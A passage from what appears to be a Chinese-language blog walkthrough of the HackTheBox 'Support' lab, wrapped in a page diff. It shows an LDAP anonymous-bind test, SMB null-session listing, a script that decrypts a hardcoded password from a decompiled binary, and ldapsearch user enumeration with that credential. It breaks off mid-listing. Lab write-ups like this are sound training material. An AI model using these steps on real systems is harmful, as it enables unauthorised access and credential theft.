@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-Support - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-Support" />
+<meta property="og:description" content="HackTheBox靶机Support" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-support/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-29T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-08-29T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-Support"/>
+<meta name="twitter:description" content="HackTheBox靶机Support"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-support/" /><link rel="prev" href="https://mi3aka.eu.org/htb-opensource/" /><link rel="next" href="https://mi3aka.eu.org/htb-redpanda/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-Support",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-support\/"
+        },"genre": "posts","wordcount":  1591 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-support\/","datePublished": "2022-08-29T14:08:30+00:00","dateModified": "2022-08-29T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-Support</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-29">2022-08-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1591 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#前期工作-1">前期工作</a></li>
+    <li><a href="#获取user权限">获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png, https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png 1.5x, https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png"
+        title="https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png" /></p>
+<p>goby扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png, https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png 1.5x, https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png"
+        title="https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png" /></p>
+<h2 id="前期工作-1">前期工作</h2>
+<ol>
+<li>LDAP NULL bind匿名绑定导致登录绕过漏洞</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ldap</span>
+</span></span><span class="line"><span class="cl"><span class="n">ldapconn</span> <span class="o">=</span> <span class="n">ldap</span><span class="o">.</span><span class="n">initialize</span><span class="p">(</span><span class="s1">&#39;ldap://10.10.11.174:389&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ldapconn</span><span class="o">.</span><span class="n">simple_bind_s</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;hello&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png, https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png 1.5x, https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png"
+        title="https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png" /></p>
+<ol start="2">
+<li>smb未授权访问</li>
+</ol>
+<p><code>smbclient -N -L 10.10.11.174</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png, https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png 1.5x, https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png"
+        title="https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png, https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png 1.5x, https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png"
+        title="https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png, https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png 1.5x, https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png"
+        title="https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png" /></p>
+<p>只有<code>//10.10.11.174/support-tools</code>可以访问</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png, https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png 1.5x, https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png"
+        title="https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png, https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png 1.5x, https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png"
+        title="https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png" /></p>
+<p>用<code>dnspy</code>进行逆向</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png, https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png 1.5x, https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png"
+        title="https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="c1">// UserInfo.Services.Protected</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">getPassword</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">Protected</span><span class="p">.</span><span class="n">enc_password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="n">array</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">array2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">^</span> <span class="n">Protected</span><span class="p">.</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="p">%</span> <span class="n">Protected</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">Length</span><span class="p">]</span> <span class="p">^</span> <span class="m">223</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">array2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// UserInfo.Services.Protected</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Token: 0x06000011 RID: 17 RVA: 0x00002170 File Offset: 0x00000370</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Note: this type is marked as &#39;beforefieldinit&#39;.</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">Protected</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Protected</span><span class="p">.</span><span class="n">enc_password</span> <span class="p">=</span> <span class="s">&#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">Protected</span><span class="p">.</span><span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;armando&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">enc_password</span> <span class="o">=</span> <span class="s2">&#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;armando&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">b64_password</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc_password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">password</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b64_password</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span><span class="o">+=</span><span class="nb">chr</span><span class="p">((</span><span class="n">b64_password</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span><span class="o">^</span><span class="mi">223</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到<code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png, https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png 1.5x, https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png"
+        title="https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png" /></p>
+<p>作为ldap的密码试了这5个好像都不对???</p>
+<h2 id="获取user权限">获取user权限</h2>
+<p>重新看了一下dnspy,发现了一个<code>ladpquery</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">public</span> <span class="n">LdapQuery</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">string</span> <span class="n">password</span> <span class="p">=</span> <span class="n">Protected</span><span class="p">.</span><span class="n">getPassword</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="n">entry</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DirectoryEntry</span><span class="p">(</span><span class="s">&#34;LDAP://support.htb&#34;</span><span class="p">,</span> <span class="s">&#34;support\\ldap&#34;</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="n">entry</span><span class="p">.</span><span class="n">AuthenticationType</span> <span class="p">=</span> <span class="n">AuthenticationTypes</span><span class="p">.</span><span class="n">Secure</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="n">ds</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DirectorySearcher</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">entry</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>去<a href="https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/" target="_blank" rel="noopener noreffer ">https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/</a>学了一下怎样用ldapsearch进行搜索</p>
+<p><code>ldapsearch -H LDAP://support.htb -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b &quot;DC=support,DC=htb&quot;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png, https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png 1.5x, https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png"
+        title="https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png, https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png 1.5x, https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png"
+        title="https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png" /></p>
+<ol>
+<li>列出所有用户名</li>
+</ol>
+<p><code>ldapsearch -H LDAP://support.htb -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b &quot;CN=Users,DC=support,DC=htb&quot; &quot;name=*&quot; | grep &quot;name:&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name: Users
+</span></span><span class="line"><span class="cl">name: krbtgt
+</span></span><span class="line"><span class="cl">name: Domain Computers
+</span></span><span class="line"><span class="cl">name: Domain Controllers
+</span></span><span class="line"><span class="cl">name: Schema Admins
+</span></span><span class="line"><span class="cl">name: Enterprise Admins
+</span></span><span class="line"><span class="cl">name: Cert Publishers
+</span></span><span class="line"><span class="cl">name: Domain Admins
+</span></span><span class="line"><span class="cl">name: Domain Users
+</span></span><span class="line"><span class="cl">name: Domain Guests
+</span></span><span class="line"><span class="cl">name: Group Policy Creator Owners
+</span></span><span class="line"><span class="cl">name: RAS and IAS Servers
+</span></span><span class="line"><span class="cl">name: Allowed RODC Password Replication Group
+</span></span><span class="line"><span class="cl">name: Denied RODC Password Replication Group
+</span></span><span class="line"><span class="cl">name: Read-only Domain Controllers
+</span></span><span class="line"><span class="cl">name: Enterprise Read-only Domain Controllers
+</span></span><span class="line"><span class="cl">name: Cloneable Domain Controllers
+</span></span><span class="line"><span class="cl">name: Protected Users
+</span></span><span class="line"><span class="cl">name: Key Admins
+</span></span><span class="line"><span class="cl">name: Enterprise Key Admins
+</span></span><span class="line"><span class="cl">name: DnsAdmins
+</span></span><span class="line"><span class="cl">name: DnsUpdateProxy
+</span></span><span class="line"><span class="cl">name: Shared Support Accounts
+</span></span><span class="line"><span class="cl">name: ldap
+</span></span><span class="line"><span class="cl">name: support
+</span></span><span class="line"><span class="cl">name: smith.rosario
+</span></span><span class="line"><span class="cl">name: hernandez.stanley
